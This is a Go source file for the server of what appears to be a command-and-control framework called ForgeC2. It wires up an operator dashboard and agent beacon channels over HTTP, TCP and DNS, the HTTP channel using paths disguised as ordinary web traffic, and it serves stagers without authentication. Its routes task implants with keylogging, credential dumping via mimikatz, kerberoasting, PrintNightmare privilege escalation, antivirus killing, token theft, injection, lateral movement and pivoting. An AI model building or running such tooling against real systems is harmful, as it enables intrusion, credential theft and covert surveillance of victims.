package server

import (
	"crypto/tls"
	"embed"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

//go:embed templates/*
var templateFS embed.FS

type Server struct {
	cfg          *config.Config
	db           *gorm.DB
	router       *gin.Engine
	tmpl         *template.Template
	wsClients    map[*websocket.Conn]bool
	wsMutex      sync.Mutex
	wsUpgrader   websocket.Upgrader
	rateLimiter  *middleware.RateLimiter
	loginLimiter *middleware.RateLimiter
	socksEngine  *socksRelayEngine
	startTime    time.Time

	dnsListener        *DNSBeaconListener
	screenMonitorAgents map[string]time.Time
	screenMonitorMu     sync.Mutex
}

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                cfg,
		db:                 database,
		router:             r,
		wsClients:          make(map[*websocket.Conn]bool),
		rateLimiter:        middleware.NewRateLimiter(BeaconRateLimit, BeaconRateWindow),
		loginLimiter:       middleware.NewRateLimiter(LoginRateLimit, LoginRateWindow),
		socksEngine:        newSocksRelayEngine(),
		startTime:          time.Now(),
		screenMonitorAgents: make(map[string]time.Time),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				return u.Host == r.Host
			},
		},
	}

	s.setupTemplates()
	s.setupRoutes()

	return s
}

func (s *Server) setupTemplates() {
	funcMap := template.FuncMap{
		"formatTime": func(t time.Time) string {
			return t.Format("2006-01-02 15:04:05")
		},
		"statusClass": func(status string) string {
			if status == "online" {
				return "bg-green-500"
			}
			return "bg-red-500"
		},
		"upper": strings.ToUpper,
		"default": func(val, def interface{}) interface{} {
			if val == nil || val == "" {
				return def
			}
			return val
		},
		"formatBytes": func(b int64) string {
			const unit = 1024
			if b < unit {
				return fmt.Sprintf("%d B", b)
			}
			div, exp := int64(unit), 0
			for n := b / unit; n >= unit; n /= unit {
				div *= unit
				exp++
			}
			return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
		},
		"relativeTime": func(t time.Time) string {
			d := time.Since(t)
			switch {
			case d < time.Minute:
				return "just now"
			case d < time.Hour:
				m := int(d.Minutes())
				if m == 1 {
					return "1 min ago"
				}
				return fmt.Sprintf("%d mins ago", m)
			case d < 24*time.Hour:
				h := int(d.Hours())
				if h == 1 {
					return "1 hour ago"
				}
				return fmt.Sprintf("%d hours ago", h)
			default:
				days := int(d.Hours() / 24)
				if days == 1 {
					return "1 day ago"
				}
				return fmt.Sprintf("%d days ago", days)
			}
		},
		"formatDuration": func(d time.Duration) string {
			if d < time.Minute {
				return fmt.Sprintf("%ds", int(d.Seconds()))
			}
			if d < time.Hour {
				return fmt.Sprintf("%dm%ds", int(d.Minutes()), int(d.Seconds())%60)
			}
			if d < 24*time.Hour {
				return fmt.Sprintf("%dh%dm", int(d.Hours()), int(d.Minutes())%60)
			}
			return fmt.Sprintf("%dd%dh", int(d.Hours()/24), int(d.Hours())%24)
		},
		"boolIcon": func(b bool) string {
			if b {
				return "✔"
			}
			return "✘"
		},
		// Math helpers for pagination (use int64 to match DB counts)
		"add":      func(a, b int64) int64 { return a + b },
		"subtract": func(a, b int64) int64 { return a - b },
		"multiply": func(a, b int64) int64 { return a * b },
		"int64":    func(v int) int64 { return int64(v) },
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseFS(templateFS, "templates/*.html")
	if err != nil {
		slog.Error("Failed to parse templates", "err", err)
		panic(err)
	}
	s.tmpl = tmpl
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// Auth with CSRF and login rate limiting
	s.router.GET("/login", middleware.CSRFProtection(), s.handleLoginPage)
	s.router.POST("/login", s.loginLimiter.Limit(), middleware.CSRFProtection(), s.handleLogin)

	// Protected routes with CSRF
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(s.AuditMiddleware())
	auth.Use(middleware.CSRFProtection())
	{
		auth.GET("/", s.handleDashboard)
		auth.GET("/dashboard", s.handleDashboard)
		auth.GET("/agents", s.handleAgents)
		auth.GET("/agents/:id", s.handleAgentDetail)
		auth.GET("/agents/:id/shell", s.handleShellPage)
		auth.GET("/agents/:id/files", s.handleFileBrowserPage)
		auth.GET("/agents/:id/screen", s.handleScreenMonitorPage)
		auth.GET("/agents/:id/tasks", s.handleGetAgentTasks)
		auth.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
		auth.POST("/agents/:id/kill", s.handleKillAgent)
		auth.POST("/agents/:id/command", s.handleSendCommand)
		auth.POST("/agents/:id/screenshot", s.handleRequestScreenshot)
		auth.POST("/agents/:id/screenshot_window", s.handleRequestScreenshotWindow)
		auth.POST("/agents/:id/ps", s.handleRequestPS)
		auth.POST("/agents/:id/keylogger/start", s.handleStartKeylogger)
		auth.POST("/agents/:id/keylogger/stop", s.handleStopKeylogger)
		auth.POST("/agents/:id/keylogger/dump", s.handleDumpKeylogger)
		auth.POST("/agents/:id/suspend", s.handleSuspendProcess)
		auth.POST("/agents/:id/resume", s.handleResumeProcess)
		auth.POST("/agents/:id/killproc", s.handleKillProcess)
		auth.POST("/agents/:id/clipboard/get", s.handleClipboardGet)
		auth.POST("/agents/:id/clipboard/set", s.handleClipboardSet)
		auth.POST("/agents/:id/find", s.handleFindFiles)
		auth.POST("/agents/:id/reg/get", s.handleRegGet)
		auth.POST("/agents/:id/reg/set", s.handleRegSet)
		auth.POST("/agents/:id/reg/delete", s.handleRegDelete)
		auth.POST("/agents/:id/reboot", s.handleReboot)
		auth.POST("/agents/:id/shutdown", s.handleShutdown)
		auth.POST("/agents/:id/drives", s.handleListDrives)
		auth.POST("/agents/:id/beacon_now", s.handleBeaconNow)
		auth.POST("/agents/:id/services", s.handleListServices)
		auth.POST("/agents/:id/portscan", s.handlePortScan)
		auth.POST("/agents/:id/netstat", s.handleNetstat)
		auth.POST("/agents/:id/users", s.handleUsers)
		auth.POST("/agents/:id/av", s.handleAV)
		auth.POST("/agents/:id/download_url", s.handleDownloadURL)
		auth.POST("/agents/:id/uninstall", s.handleUninstall)
		auth.POST("/agents/:id/set_sleep", s.handleSetSleep)
		auth.POST("/agents/:id/kill_av", s.handleKillAV)
		auth.POST("/agents/:id/elevate", s.handleElevate)
		auth.POST("/agents/:id/elevate/printnightmare", s.handleElevatePrintNightmare)
		auth.POST("/agents/:id/execute_assembly", s.handleExecuteAssembly)
		auth.POST("/agents/:id/kerberoast", s.handleKerberoast)
		auth.POST("/agents/:id/mimikatz", s.handleMimikatz)
		auth.POST("/agents/:id/bof", s.handleBOF)
		auth.POST("/agents/:id/creds", s.handleCredsDump)
		auth.POST("/agents/:id/inject", s.handleInject)
		auth.POST("/agents/:id/lateral", s.handleLateral)
		auth.POST("/agents/:id/socks", s.handleSocks)
		auth.POST("/agents/:id/link", s.handleLinkAgent)
		auth.POST("/agents/:id/unlink", s.handleUnlinkAgent)
		auth.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
		auth.POST("/agents/:id/download", s.handleDownload)
		auth.POST("/agents/:id/upload", s.handleUploadFile)
		auth.POST("/agents/:id/note", s.handleUpdateNote)
		auth.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
		auth.DELETE("/agents/:id", s.handleDeleteAgent)
		auth.POST("/agents/batch", s.handleBatchCommand)
		auth.POST("/agents/:id/files/ls", s.handleListDir)
		auth.POST("/agents/:id/files/delete", s.handleFileDelete)
		auth.POST("/agents/:id/files/read", s.handleFileRead)
		auth.POST("/agents/:id/files/upload", s.handleFileUploadFromAgent)
		auth.POST("/agents/:id/screen/start", s.handleStartScreenMonitor)
		auth.POST("/agents/:id/screen/stop", s.handleStopScreenMonitor)

		// ── Token Impersonation ────────────────────────────────────────────────
		auth.GET("/agents/:id/token", s.handleTokenPage)
		auth.GET("/agents/:id/token/list", s.handleGetTokens)
		auth.POST("/agents/:id/token/list_procs", s.handleTokenListProcs)
		auth.POST("/agents/:id/token/steal", s.handleTokenSteal)
		auth.POST("/agents/:id/token/make", s.handleTokenMake)
		auth.POST("/agents/:id/token/revert", s.handleTokenRevert)
		auth.POST("/agents/:id/token/whoami", s.handleTokenWhoami)
		auth.DELETE("/agents/:id/token/:token_id", s.handleTokenDrop)
		auth.POST("/agents/:id/token/:token_id/impersonate", s.handleTokenImpersonate)
		auth.POST("/agents/:id/token/:token_id/note", s.handleTokenNoteUpdate)
		auth.GET("/generate", s.handleGeneratePage)
		auth.POST("/generate/exe", s.handleGenerateEXE)
		auth.POST("/generate/ps1", s.handleGeneratePS1)
		auth.POST("/generate/linux", s.handleGenerateLinux)
		auth.POST("/generate/stager", s.handleGenerateStager)
		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)

		// Listeners
		auth.GET("/listeners", s.handleListenersPage)
		auth.GET("/listeners/:id", s.handleListenerDetail)
		auth.GET("/api/listeners", s.handleListListeners)
		auth.POST("/api/listeners", s.handleCreateListener)
		auth.PUT("/api/listeners/:id", s.handleUpdateListener)
		auth.DELETE("/api/listeners/:id", s.handleDeleteListener)
		auth.GET("/tasks", s.handleTaskHistory)
		auth.GET("/tasks/export", s.handleExportTasks)
		auth.GET("/tasks/:taskId", s.handleGetTaskStatus)
		auth.POST("/logout", s.handleLogout)
		auth.GET("/credentials", s.handleCredentialsPage)
		auth.GET("/credentials/export", s.handleExportCredentials)
		auth.POST("/credentials/add", s.handleAddCredential)
		auth.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
		auth.GET("/pivoting", s.handlePivoting)
		auth.GET("/topology", s.handleTopologyPage)
		auth.GET("/api/topology/data", s.handleTopologyData)
		auth.GET("/loot", s.handleLootPage)
		auth.GET("/search", s.handleGlobalSearch)
		auth.GET("/audit", s.handleAuditLogPage)
		auth.GET("/audit/logs", s.handleGetAuditLogs)
		auth.GET("/settings", s.handleSettingsPage)
		auth.POST("/settings/password", s.handleChangePassword)
		auth.POST("/settings/agent", s.handleSaveAgentConfig)
		auth.POST("/settings/server", s.handleSaveServerConfig)
		auth.POST("/settings/malleable", s.handleSaveMalleableProfile)
		auth.POST("/settings/purge/tasks", s.handlePurgeTasks)
		auth.POST("/settings/purge/audit", s.handlePurgeAuditLogs)
		auth.POST("/settings/jwt/regenerate", s.handleRegenerateJWT)
		auth.POST("/settings/db/vacuum", s.handleDBVacuum)
		auth.POST("/settings/db/backup", s.handleBackupDatabase)
		auth.GET("/settings/config/download", s.handleDownloadConfig)
		auth.GET("/ws", s.handleWebSocket)
		auth.GET("/tokens", s.handleGlobalTokensPage)

		// ── User Management ────────────────────────────────────────────────
		auth.GET("/users", s.handleUsersPage)
		auth.POST("/users/add", s.handleAddUser)
		auth.POST("/users/:id/toggle", s.handleToggleUser)
		auth.POST("/users/:id/password", s.handleSetUserPassword)
		auth.DELETE("/users/:id", s.handleDeleteUser)

		// ── SOCKS Relay (C2-side tunnel) ─────────────────────────────────────
		auth.POST("/agents/:id/socks_relay/start", s.handleStartSocksRelay)
		auth.POST("/agents/:id/socks_relay/stop", s.handleStopSocksRelay)
		auth.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
		auth.GET("/socks/sessions", s.handleGetSocksSessions)
	}

	// Agent Beacon API with rate limiting
	api := s.router.Group("/api/v1")
	api.Use(s.rateLimiter.Limit())
	{
		api.POST("/beacon", s.handleBeacon)
		api.POST("/screen_frame", s.handleScreenFrame)

		// Malleable profile support (similar to Cobalt Strike)
		api.POST("/generate_204", s.handleBeacon)
		api.POST("/th", s.handleBeacon) // for bing like /th?id=...
		api.GET("/generate_204", s.handleBeacon) // support GET if profile uses
		api.GET("/th", s.handleBeacon)
	}

	// Stage serving for Artifact Kit (no auth — stagers are unauthenticated)
	s.router.GET("/stage/:xorKey", s.handleServeStage)

	// Screenshot serving (protected)
	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
}

// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	s.wsMutex.Lock()
	s.wsClients[conn] = true
	s.wsMutex.Unlock()

	slog.Info("WebSocket client connected")

	go func() {
		defer func() {
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			conn.Close()
			slog.Info("WebSocket client disconnected")
		}()

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			default:
				conn.SetReadDeadline(time.Now().Add(60 * time.Second))
				_, _, err := conn.ReadMessage()
				if err != nil {
					return
				}
			}
		}
	}()
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Iterates over a snapshot of the map to avoid holding the lock during writes.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.Lock()
	clients := make([]*websocket.Conn, 0, len(s.wsClients))
	for conn := range s.wsClients {
		clients = append(clients, conn)
	}
	s.wsMutex.Unlock()

	for _, conn := range clients {
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := conn.WriteMessage(websocket.TextMessage, message); err != nil {
			slog.Error("Failed to send WebSocket message", "err", err)
			s.wsMutex.Lock()
			conn.Close()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
		}
	}
}

// broadcastAgentNotification sends a notification to all WebSocket clients
func (s *Server) broadcastAgentNotification(agent db.Agent) {
	payload := map[string]string{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":     "task_update",
		"agent_id": agentID,
		"task_id":  task.ID,
		"task_type": task.Type,
		"status":   task.Status,
		"command":  task.Command,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	slog.Info("old data cleanup completed")
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = 60
	}
	return time.Duration(d) * time.Second
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff) // recurse into agent subdirs
			// optionally remove empty dirs
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(path)
		}
	}
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()
	go s.cleanupStaleSocks()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		go s.startTCPListener()
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0)
		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("DNS beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req)
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		s.dnsListener = dl
		go dl.Start()
	}

	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:      addr,
			Handler:   s.router,
			TLSConfig: tlsCfg,
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		s.cleanupOldData()
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}

// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > 16*1024*1024 {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req)

		respBytes, _ := json.Marshal(resp)
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Agent, bool) {
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		return nil, err
	}
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}
